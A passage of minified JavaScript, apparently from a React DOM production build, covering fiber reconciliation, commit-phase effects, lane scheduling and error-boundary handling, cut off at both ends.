de(n),null;if(s=(n.flags&128)!==0,i=r.rendering,i===null)if(s)zt(r,!1);else{if(te!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(i=xa(e),i!==null){for(n.flags|=128,zt(r,!1),s=i.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)r=t,e=s,r.flags&=14680066,i=r.alternate,i===null?(r.childLanes=0,r.lanes=e,r.child=null,r.subtreeFlags=0,r.memoizedProps=null,r.memoizedState=null,r.updateQueue=null,r.dependencies=null,r.stateNode=null):(r.childLanes=i.childLanes,r.lanes=i.lanes,r.child=i.child,r.subtreeFlags=0,r.deletions=null,r.memoizedProps=i.memoizedProps,r.memoizedState=i.memoizedState,r.updateQueue=i.updateQueue,r.type=i.type,e=i.dependencies,r.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return H(G,G.current&1|2),n.child}e=e.sibling}r.tail!==null&&J()>Lt&&(n.flags|=128,s=!0,zt(r,!1),n.lanes=4194304)}else{if(!s)if(e=xa(i),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),zt(r,!0),r.tail===null&&r.tailMode==="hidden"&&!i.alternate&&!$)return de(n),null}else 2*J()-r.renderingStartTime>Lt&&t!==1073741824&&(n.flags|=128,s=!0,zt(r,!1),n.lanes=4194304);r.isBackwards?(i.sibling=n.child,n.child=i):(t=r.last,t!==null?t.sibling=i:n.child=i,r.last=i)}return r.tail!==null?(n=r.tail,r.rendering=n,r.tail=n.sibling,r.renderingStartTime=J(),n.sibling=null,t=G.current,H(G,s?t&1|2:t&1),n):(de(n),null);case 22:case 23:return mo(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?Ce&1073741824&&(de(n),n.subtreeFlags&6&&(n.flags|=8192)):de(n),null;case 24:return null;case 25:return null}throw Error(L(156,n.tag))}function Jh(e,n){switch(Ki(n),n.tag){case 1:return Te(n.type)&&ma(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return Tt(),V(_e),V(he),so(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return to(n),null;case 13:if(V(G),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(L(340));St()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return V(G),null;case 4:return Tt(),null;case 10:return Ji(n.type._context),null;case 22:case 23:return mo(),null;case 24:return null;default:return null}}var Fs=!1,pe=!1,Zh=typeof WeakSet=="function"?WeakSet:Set,N=null;function dt(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){Q(e,n,s)}else t.current=null}function fi(e,n,t){try{t()}catch(s){Q(e,n,s)}}var El=!1;function ef(e,n){if(Qr=da,e=iu(),$i(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var a=s.anchorOffset,r=s.focusNode;s=s.focusOffset;try{t.nodeType,r.nodeType}catch{t=null;break e}var i=0,l=-1,c=-1,u=0,f=0,p=e,g=null;n:for(;;){for(var v;p!==t||a!==0&&p.nodeType!==3||(l=i+a),p!==r||s!==0&&p.nodeType!==3||(c=i+s),p.nodeType===3&&(i+=p.nodeValue.length),(v=p.firstChild)!==null;)g=p,p=v;for(;;){if(p===e)break n;if(g===t&&++u===a&&(l=i),g===r&&++f===s&&(c=i),(v=p.nextSibling)!==null)break;p=g,g=p.parentNode}p=v}t=l===-1||c===-1?null:{start:l,end:c}}else t=null}t=t||{start:0,end:0}}else t=null;for(Jr={focusedElem:e,selectionRange:t},da=!1,N=n;N!==null;)if(n=N,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,N=e;else for(;N!==null;){n=N;try{var k=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(k!==null){var y=k.memoizedProps,S=k.memoizedState,m=n.stateNode,d=m.getSnapshotBeforeUpdate(n.elementType===n.type?y:He(n.type,y),S);m.__reactInternalSnapshotBeforeUpdate=d}break;case 3:var h=n.stateNode.containerInfo;h.nodeType===1?h.textContent="":h.nodeType===9&&h.documentElement&&h.removeChild(h.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(L(163))}}catch(x){Q(n,n.return,x)}if(e=n.sibling,e!==null){e.return=n.return,N=e;break}N=n.return}return k=El,El=!1,k}function Jt(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var a=s=s.next;do{if((a.tag&e)===e){var r=a.destroy;a.destroy=void 0,r!==void 0&&fi(n,t,r)}a=a.next}while(a!==s)}}function za(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function mi(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function td(e){var n=e.alternate;n!==null&&(e.alternate=null,td(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[Ze],delete n[ds],delete n[ni],delete n[Rh],delete n[Oh])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function sd(e){return e.tag===5||e.tag===3||e.tag===4}function Ll(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||sd(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function gi(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=fa));else if(s!==4&&(e=e.child,e!==null))for(gi(e,n,t),e=e.sibling;e!==null;)gi(e,n,t),e=e.sibling}function yi(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(yi(e,n,t),e=e.sibling;e!==null;)yi(e,n,t),e=e.sibling}var oe=null,We=!1;function fn(e,n,t){for(t=t.child;t!==null;)ad(e,n,t),t=t.sibling}function ad(e,n,t){if(en&&typeof en.onCommitFiberUnmount=="function")try{en.onCommitFiberUnmount(Na,t)}catch{}switch(t.tag){case 5:pe||dt(t,n);case 6:var s=oe,a=We;oe=null,fn(e,n,t),oe=s,We=a,oe!==null&&(We?(e=oe,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):oe.removeChild(t.stateNode));break;case 18:oe!==null&&(We?(e=oe,t=t.stateNode,e.nodeType===8?dr(e.parentNode,t):e.nodeType===1&&dr(e,t),is(e)):dr(oe,t.stateNode));break;case 4:s=oe,a=We,oe=t.stateNode.containerInfo,We=!0,fn(e,n,t),oe=s,We=a;break;case 0:case 11:case 14:case 15:if(!pe&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){a=s=s.next;do{var r=a,i=r.destroy;r=r.tag,i!==void 0&&(r&2||r&4)&&fi(t,n,i),a=a.next}while(a!==s)}fn(e,n,t);break;case 1:if(!pe&&(dt(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(l){Q(t,n,l)}fn(e,n,t);break;case 21:fn(e,n,t);break;case 22:t.mode&1?(pe=(s=pe)||t.memoizedState!==null,fn(e,n,t),pe=s):fn(e,n,t);break;default:fn(e,n,t)}}function Cl(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new Zh),n.forEach(function(s){var a=uf.bind(null,e,s);t.has(s)||(t.add(s),s.then(a,a))})}}function Ue(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var a=t[s];try{var r=e,i=n,l=i;e:for(;l!==null;){switch(l.tag){case 5:oe=l.stateNode,We=!1;break e;case 3:oe=l.stateNode.containerInfo,We=!0;break e;case 4:oe=l.stateNode.containerInfo,We=!0;break e}l=l.return}if(oe===null)throw Error(L(160));ad(r,i,a),oe=null,We=!1;var c=a.alternate;c!==null&&(c.return=null),a.return=null}catch(u){Q(a,n,u)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)rd(n,e),n=n.sibling}function rd(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Ue(n,e),Qe(e),s&4){try{Jt(3,e,e.return),za(3,e)}catch(y){Q(e,e.return,y)}try{Jt(5,e,e.return)}catch(y){Q(e,e.return,y)}}break;case 1:Ue(n,e),Qe(e),s&512&&t!==null&&dt(t,t.return);break;case 5:if(Ue(n,e),Qe(e),s&512&&t!==null&&dt(t,t.return),e.flags&32){var a=e.stateNode;try{ts(a,"")}catch(y){Q(e,e.return,y)}}if(s&4&&(a=e.stateNode,a!=null)){var r=e.memoizedProps,i=t!==null?t.memoizedProps:r,l=e.type,c=e.updateQueue;if(e.updateQueue=null,c!==null)try{l==="input"&&r.type==="radio"&&r.name!=null&&Lc(a,r),Br(l,i);var u=Br(l,r);for(i=0;i<c.length;i+=2){var f=c[i],p=c[i+1];f==="style"?Mc(a,p):f==="dangerouslySetInnerHTML"?Ac(a,p):f==="children"?ts(a,p):ji(a,f,p,u)}switch(l){case"input":Rr(a,r);break;case"textarea":Cc(a,r);break;case"select":var g=a._wrapperState.wasMultiple;a._wrapperState.wasMultiple=!!r.multiple;var v=r.value;v!=null?ft(a,!!r.multiple,v,!1):g!==!!r.multiple&&(r.defaultValue!=null?ft(a,!!r.multiple,r.defaultValue,!0):ft(a,!!r.multiple,r.multiple?[]:"",!1))}a[ds]=r}catch(y){Q(e,e.return,y)}}break;case 6:if(Ue(n,e),Qe(e),s&4){if(e.stateNode===null)throw Error(L(162));a=e.stateNode,r=e.memoizedProps;try{a.nodeValue=r}catch(y){Q(e,e.return,y)}}break;case 3:if(Ue(n,e),Qe(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{is(n.containerInfo)}catch(y){Q(e,e.return,y)}break;case 4:Ue(n,e),Qe(e);break;case 13:Ue(n,e),Qe(e),a=e.child,a.flags&8192&&(r=a.memoizedState!==null,a.stateNode.isHidden=r,!r||a.alternate!==null&&a.alternate.memoizedState!==null||(ho=J())),s&4&&Cl(e);break;case 22:if(f=t!==null&&t.memoizedState!==null,e.mode&1?(pe=(u=pe)||f,Ue(n,e),pe=u):Ue(n,e),Qe(e),s&8192){if(u=e.memoizedState!==null,(e.stateNode.isHidden=u)&&!f&&e.mode&1)for(N=e,f=e.child;f!==null;){for(p=N=f;N!==null;){switch(g=N,v=g.child,g.tag){case 0:case 11:case 14:case 15:Jt(4,g,g.return);break;case 1:dt(g,g.return);var k=g.stateNode;if(typeof k.componentWillUnmount=="function"){s=g,t=g.return;try{n=s,k.props=n.memoizedProps,k.state=n.memoizedState,k.componentWillUnmount()}catch(y){Q(s,t,y)}}break;case 5:dt(g,g.return);break;case 22:if(g.memoizedState!==null){Al(p);continue}}v!==null?(v.return=g,N=v):Al(p)}f=f.sibling}e:for(f=null,p=e;;){if(p.tag===5){if(f===null){f=p;try{a=p.stateNode,u?(r=a.style,typeof r.setProperty=="function"?r.setProperty("display","none","important"):r.display="none"):(l=p.stateNode,c=p.memoizedProps.style,i=c!=null&&c.hasOwnProperty("display")?c.display:null,l.style.display=Nc("display",i))}catch(y){Q(e,e.return,y)}}}else if(p.tag===6){if(f===null)try{p.stateNode.nodeValue=u?"":p.memoizedProps}catch(y){Q(e,e.return,y)}}else if((p.tag!==22&&p.tag!==23||p.memoizedState===null||p===e)&&p.child!==null){p.child.return=p,p=p.child;continue}if(p===e)break e;for(;p.sibling===null;){if(p.return===null||p.return===e)break e;f===p&&(f=null),p=p.return}f===p&&(f=null),p.sibling.return=p.return,p=p.sibling}}break;case 19:Ue(n,e),Qe(e),s&4&&Cl(e);break;case 21:break;default:Ue(n,e),Qe(e)}}function Qe(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(sd(t)){var s=t;break e}t=t.return}throw Error(L(160))}switch(s.tag){case 5:var a=s.stateNode;s.flags&32&&(ts(a,""),s.flags&=-33);var r=Ll(e);yi(e,r,a);break;case 3:case 4:var i=s.stateNode.containerInfo,l=Ll(e);gi(e,l,i);break;default:throw Error(L(161))}}catch(c){Q(e,e.return,c)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function nf(e,n,t){N=e,id(e)}function id(e,n,t){for(var s=(e.mode&1)!==0;N!==null;){var a=N,r=a.child;if(a.tag===22&&s){var i=a.memoizedState!==null||Fs;if(!i){var l=a.alternate,c=l!==null&&l.memoizedState!==null||pe;l=Fs;var u=pe;if(Fs=i,(pe=c)&&!u)for(N=a;N!==null;)i=N,c=i.child,i.tag===22&&i.memoizedState!==null?Nl(a):c!==null?(c.return=i,N=c):Nl(a);for(;r!==null;)N=r,id(r),r=r.sibling;N=a,Fs=l,pe=u}Pl(e)}else a.subtreeFlags&8772&&r!==null?(r.return=a,N=r):Pl(e)}}function Pl(e){for(;N!==null;){var n=N;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:pe||za(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!pe)if(t===null)s.componentDidMount();else{var a=n.elementType===n.type?t.memoizedProps:He(n.type,t.memoizedProps);s.componentDidUpdate(a,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var r=n.updateQueue;r!==null&&hl(n,r,s);break;case 3:var i=n.updateQueue;if(i!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}hl(n,i,t)}break;case 5:var l=n.stateNode;if(t===null&&n.flags&4){t=l;var c=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":c.autoFocus&&t.focus();break;case"img":c.src&&(t.src=c.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var u=n.alternate;if(u!==null){var f=u.memoizedState;if(f!==null){var p=f.dehydrated;p!==null&&is(p)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(L(163))}pe||n.flags&512&&mi(n)}catch(g){Q(n,n.return,g)}}if(n===e){N=null;break}if(t=n.sibling,t!==null){t.return=n.return,N=t;break}N=n.return}}function Al(e){for(;N!==null;){var n=N;if(n===e){N=null;break}var t=n.sibling;if(t!==null){t.return=n.return,N=t;break}N=n.return}}function Nl(e){for(;N!==null;){var n=N;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{za(4,n)}catch(c){Q(n,t,c)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var a=n.return;try{s.componentDidMount()}catch(c){Q(n,a,c)}}var r=n.return;try{mi(n)}catch(c){Q(n,r,c)}break;case 5:var i=n.return;try{mi(n)}catch(c){Q(n,i,c)}}}catch(c){Q(n,n.return,c)}if(n===e){N=null;break}var l=n.sibling;if(l!==null){l.return=n.return,N=l;break}N=n.return}}var tf=Math.ceil,Ta=hn.ReactCurrentDispatcher,uo=hn.ReactCurrentOwner,ze=hn.ReactCurrentBatchConfig,z=0,ie=null,ee=null,le=0,Ce=0,pt=qn(0),te=0,ys=null,Kn=0,Fa=0,po=0,Zt=null,be=null,ho=0,Lt=1/0,tn=null,Ea=!1,vi=null,Cn=null,Bs=!1,bn=null,La=0,es=0,wi=null,ta=-1,sa=0;function ge(){return z&6?J():ta!==-1?ta:ta=J()}function Pn(e){return e.mode&1?z&2&&le!==0?le&-le:zh.transition!==null?(sa===0&&(sa=Wc()),sa):(e=B,e!==0||(e=window.event,e=e===void 0?16:Qc(e.type)),e):1}function Ye(e,n,t,s){if(50<es)throw es=0,wi=null,Error(L(185));bs(e,t,s),(!(z&2)||e!==ie)&&(e===ie&&(!(z&2)&&(Fa|=t),te===4&&wn(e,le)),Ee(e,s),t===1&&z===0&&!(n.mode&1)&&(Lt=J()+500,Ra&&Rn()))}function Ee(e,n){var t=e.callbackNode;zp(e,n);var s=ua(e,e===ie?le:0);if(s===0)t!==null&&Fo(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&Fo(t),n===1)e.tag===0?Dh(Ml.bind(null,e)):gu(Ml.bind(null,e)),Ih(function(){!(z&6)&&Rn()}),t=null;else{switch(Vc(s)){case 1:t=Di;break;case 4:t=Uc;break;case 16:t=ca;break;case 536870912:t=Hc;break;default:t=ca}t=fd(t,od.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function od(e,n){if(ta=-1,sa=0,z&6)throw Error(L(327));var t=e.callbackNode;if(wt()&&e.callbackNode!==t)return null;var s=ua(e,e===ie?le:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=Ca(e,s);else{n=s;var a=z;z|=2;var r=cd();(ie!==e||le!==n)&&(tn=null,Lt=J()+500,Un(e,n));do try{rf();break}catch(l){ld(e,l)}while(!0);Qi(),Ta.current=r,z=a,ee!==null?n=0:(ie=null,le=0,n=te)}if(n!==0){if(n===2&&(a=$r(e),a!==0&&(s=a,n=ki(e,a))),n===1)throw t=ys,Un(e,0),wn(e,s),Ee(e,J()),t;if(n===6)wn(e,s);else{if(a=e.current.alternate,!(s&30)&&!sf(a)&&(n=Ca(e,s),n===2&&(r=$r(e),r!==0&&(s=r,n=ki(e,r))),n===1))throw t=ys,Un(e,0),wn(e,s),Ee(e,J()),t;switch(e.finishedWork=a,e.finishedLanes=s,n){case 0:case 1:throw Error(L(345));case 2:Dn(e,be,tn);break;case 3:if(wn(e,s),(s&130023424)===s&&(n=ho+500-J(),10<n)){if(ua(e,0)!==0)break;if(a=e.suspendedLanes,(a&s)!==s){ge(),e.pingedLanes|=e.suspendedLanes&a;break}e.timeoutHandle=ei(Dn.bind(null,e,be,tn),n);break}Dn(e,be,tn);break;case 4:if(wn(e,s),(s&4194240)===s)break;for(n=e.eventTimes,a=-1;0<s;){var i=31-Ke(s);r=1<<i,i=n[i],i>a&&(a=i),s&=~r}if(s=a,s=J()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*tf(s/1960))-s,10<s){e.timeoutHandle=ei(Dn.bind(null,e,be,tn),s);break}Dn(e,be,tn);break;case 5:Dn(e,be,tn);break;default:throw Error(L(329))}}}return Ee(e,J()),e.callbackNode===t?od.bind(null,e):null}function ki(e,n){var t=Zt;return e.current.memoizedState.isDehydrated&&(Un(e,n).flags|=256),e=Ca(e,n),e!==2&&(n=be,be=t,n!==null&&bi(n)),e}function bi(e){be===null?be=e:be.push.apply(be,e)}function sf(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var a=t[s],r=a.getSnapshot;a=a.value;try{if(!Xe(r(),a))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function wn(e,n){for(n&=~po,n&=~Fa,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-Ke(n),s=1<<t;e[t]=-1,n&=~s}}function Ml(e){if(z&6)throw Error(L(327));wt();var n=ua(e,0);if(!(n&1))return Ee(e,J()),null;var t=Ca(e,n);if(e.tag!==0&&t===2){var s=$r(e);s!==0&&(n=s,t=ki(e,s))}if(t===1)throw t=ys,Un(e,0),wn(e,n),Ee(e,J()),t;if(t===6)throw Error(L(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Dn(e,be,tn),Ee(e,J()),null}function fo(e,n){var t=z;z|=1;try{return e(n)}finally{z=t,z===0&&(Lt=J()+500,Ra&&Rn())}}function Yn(e){bn!==null&&bn.tag===0&&!(z&6)&&wt();var n=z;z|=1;var t=ze.transition,s=B;try{if(ze.transition=null,B=1,e)return e()}finally{B=s,ze.transition=t,z=n,!(z&6)&&Rn()}}function mo(){Ce=pt.current,V(pt)}function Un(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,jh(t)),ee!==null)for(t=ee.return;t!==null;){var s=t;switch(Ki(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&ma();break;case 3:Tt(),V(_e),V(he),so();break;case 5:to(s);break;case 4:Tt();break;case 13:V(G);break;case 19:V(G);break;case 10:Ji(s.type._context);break;case 22:case 23:mo()}t=t.return}if(ie=e,ee=e=An(e.current,null),le=Ce=n,te=0,ys=null,po=Fa=Kn=0,be=Zt=null,Fn!==null){for(n=0;n<Fn.length;n++)if(t=Fn[n],s=t.interleaved,s!==null){t.interleaved=null;var a=s.next,r=t.pending;if(r!==null){var i=r.next;r.next=a,s.next=i}t.pending=s}Fn=null}return e}function ld(e,n){do{var t=ee;try{if(Qi(),Zs.current=_a,Sa){for(var s=K.memoizedState;s!==null;){var a=s.queue;a!==null&&(a.pending=null),s=s.next}Sa=!1}if(Gn=0,ae=ne=K=null,Qt=!1,fs=0,uo.current=null,t===null||t.return===null){te=1,ys=n,ee=null;break}e:{var r=e,i=t.return,l=t,c=n;if(n=le,l.flags|=32768,c!==null&&typeof c=="object"&&typeof c.then=="function"){var u=c,f=l,p=f.tag;if(!(f.mode&1)&&(p===0||p===11||p===15)){var g=f.alternate;g?(f.updateQueue=g.updateQueue,f.memoizedState=g.memoizedState,f.lanes=g.lanes):(f.updateQueue=null,f.memoizedState=null)}var v=wl(i);if(v!==null){v.flags&=-257,kl(v,i,l,r,n),v.mode&1&&vl(r,u,n),n=v,c=u;var k=n.updateQueue;if(k===null){var y=new Set;y.add(c),n.updateQueue=y}else k.add(c);break e}else{if(!(n&1)){vl(r,u,n),go();break e}c=Error(L(426))}}else if($&&l.mode&1){var S=wl(i);if(S!==null){!(S.flags&65536)&&(S.flags|=256),kl(S,i,l,r,n),Yi(Et(c,l));break e}}r=c=Et(c,l),te!==4&&(te=2),Zt===null?Zt=[r]:Zt.push(r),r=i;do{switch(r.tag){case 3:r.flags|=65536,n&=-n,r.lanes|=n;var m=Vu(r,c,n);pl(r,m);break e;case 1:l=c;var d=r.type,h=r.stateNode;if(!(r.flags&128)&&(typeof d.getDerivedStateFromError=="function"||h!==null&&typeof h.componentDidCatch=="function"&&(Cn===null||!Cn.has(h)))){r.flags|=65536,n&=-n,r.lanes|=n;var x=$u(r,l,n);pl(r,x);break e}}r=r.return}while(r!==null)}dd(t)}catch(b){n=b,ee===t&&t!==null&&(ee=t=t.return);continue}break}while(!0)}function cd(){var e=Ta.current;return Ta.current=_a,e===null?_a:e}function go(){(te===0||te===3||te===2)&&(te=4),ie===null||!(Kn&268435455)&&!(Fa&268435455)||wn(ie,le)}function Ca(e,n){var t=z;z|=2;var s=cd();(ie!==e||le!==n)&&(tn=null,Un(e,n));do try{af();break}catch(a){ld(e,a)}while(!0);if(Qi(),z=t,Ta.current=s,ee!==null)throw Error(L(261));return ie=null,le=0,te}function af(){for(;ee!==null;)ud(ee)}function rf(){for(;ee!==null&&!Ap();)ud(ee)}function ud(e){var n=hd(e.alternate,e,Ce);e.memoizedProps=e.pendingProps,n===null?dd(e):ee=n,uo.current=null}function dd(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=Jh(t,n),t!==null){t.flags&=32767,ee=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{te=6,ee=null;return}}else if(t=Qh(t,n,Ce),t!==null){ee=t;return}if(n=n.sibling,n!==null){ee=n;return}ee=n=e}while(n!==null);te===0&&(te=5)}function Dn(e,n,t){var s=B,a=ze.transition;try{ze.transition=null,B=1,of(e,n,t,s)}finally{ze.transition=a,B=s}return null}function of(e,n,t,s){do wt();while(bn!==null);if(z&6)throw Error(L(327));t=e.finishedWork;var a=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(L(177));e.callbackNode=null,e.callbackPriority=0;var r=t.lanes|t.childLanes;if(Fp(e,r),e===ie&&(ee=ie=null,le=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||Bs||(Bs=!0,fd(ca,function(){return wt(),null})),r=(t.flags&15990)!==0,t.subtreeFlags&15990||r){r=ze.transition,ze.transition=null;var i=B;B=1;var l=z;z|=4,uo.current=null,ef(e,t),rd(t,e),Eh(Jr),da=!!Qr,Jr=Qr=null,e.current=t,nf(t),Np(),z=l,B=i,ze.transition=r}else e.current=t;if(Bs&&(Bs=!1,bn=e,La=a),r=e.pendingLanes,r===0&&(Cn=null),Ip(t.stateNode),Ee(e,J()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)a=n[t],s(a.value,{componentStack:a.stack,digest:a.digest});if(Ea)throw Ea=!1,e=vi,vi=null,e;return La&1&&e.tag!==0&&wt(),r=e.pendingLanes,r&1?e===wi?es++:(es=0,wi=e):es=0,Rn(),null}function wt(){if(bn!==null){var e=Vc(La),n=ze.transition,t=B;try{if(ze.transition=null,B=16>e?16:e,bn===null)var s=!1;else{if(e=bn,bn=null,La=0,z&6)throw Error(L(331));var a=z;for(z|=4,N=e.current;N!==null;){var r=N,i=r.child;if(N.flags&16){var l=r.deletions;if(l!==null){for(var c=0;c<l.length;c++){var u=l[c];for(N=u;N!==null;){var f=N;switch(f.tag){case 0:case 11:case 15:Jt(8,f,r)}var p=f.child;if(p!==null)p.return=f,N=p;else for(;N!==null;){f=N;var g=f.sibling,v=f.return;if(td(f),f===u){N=null;break}if(g!==null){g.return=v,N=g;break}N=v}}}var k=r.alternate;if(k!==null){var y=k.child;if(y!==null){k.child=null;do{var S=y.sibling;y.sibling=null,y=S}while(y!==null)}}N=r}}if(r.subtreeFlags&2064&&i!==null)i.return=r,N=i;else e:for(;N!==null;){if(r=N,r.flags&2048)switch(r.tag){case 0:case 11:case 15:Jt(9,r,r.return)}var m=r.sibling;if(m!==null){m.return=r.return,N=m;break e}N=r.return}}var d=e.current;for(N=d;N!==null;){i=N;var h=i.child;if(i.subtreeFlags&2064&&h!==null)h.return=i,N=h;else e:for(i=d;N!==null;){if(l=N,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:za(9,l)}}catch(b){Q(l,l.return,b)}if(l===i){N=null;break e}var x=l.sibling;if(x!==null){x.return=l.return,N=x;break e}N=l.return}}if(z=a,Rn(),en&&typeof en.onPostCommitFiberRoot=="function")try{en.onPostCommitFiberRoot(Na,e)}catch{}s=!0}return s}finally{B=t,ze.transition=n}}return!1}function jl(e,n,t){n=Et(t,n),n=Vu(e,n,1),e=Ln(e,n,1),n=ge(),e!==null&&(bs(e,1,n),Ee(e,n))}function Q(e,n,t){if(e.tag===3)jl(e,e,t);else for(;n!==null;){if(n.tag===3){jl(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(Cn===null||!Cn.has(s))){e=Et(t,e),e=$u(n,e,1),n=Ln(n,e,1),e=ge(),n!==null&&(bs(n,1,e),Ee(n,e));break}}n=n.return}}function lf(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=ge(),e.pingedLanes|=e.suspendedLanes&t,ie===e&&(le&t)===t&&(te===4||te===3&&(le&130023424)===le&&500>J()-ho?Un(e,0):po|=t),Ee(e,n)}function pd(e,n){n===0&&(e.mode&1?(n=Ns,Ns<<=1,!(Ns&130023424)&&(Ns=4194304)):n=1);var t=ge();e=dn(e,n),e!==null&&(bs(e,n,t),Ee(e,t))}function cf(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),pd(e,t)}function uf(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,a=e.memoizedState;a!==null&&(t=a.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(L(314))}s!==null&&s.delete(n),pd(e,t)}var hd;hd=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||_e.current)Se=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return Se=!1,Xh(e,n,t);Se=!!(e.flags&131072)}else Se=!1,$&&n.flags&1048576&&yu(n,va,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;na(e,n),e=n.pendingProps;var a=xt(n,he.current);vt(n,t),a=ro(null,n,s,e,a,t);var r=io();return n.flags|=1,typeof a=="object"&&a!==null&&typeof a.render=="function"&&a.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,Te(s)?(r=!0,ga(n)):r=!1,n.memoizedState=a.state!==null&&a.state!==void 0?a.state:null,eo(n),a.updater=Da,n.stateNode=a,a._reactInternals=n,oi(n,s,e,t),n=ui(null,n,s,!0,r,t)):(n.tag=0,$&&r&&Gi(n),fe(null,n,a,t),n=n.child),n;case 16:s=n.elementType;e:{switch(na(e,n),e=n.pendingProps,a=s._init,s=a(s._payload),n.type=s,a=n.tag=pf(s),e=He(s,e),a){case 0:n=ci(null,n,s,e,t);break e;case 1:n=Sl(null,n,s,e,t);break e;case 11:n=bl(null,n,s,e,t);break e;case 14:n=xl(null,n,s,He(s.type,e),t);break 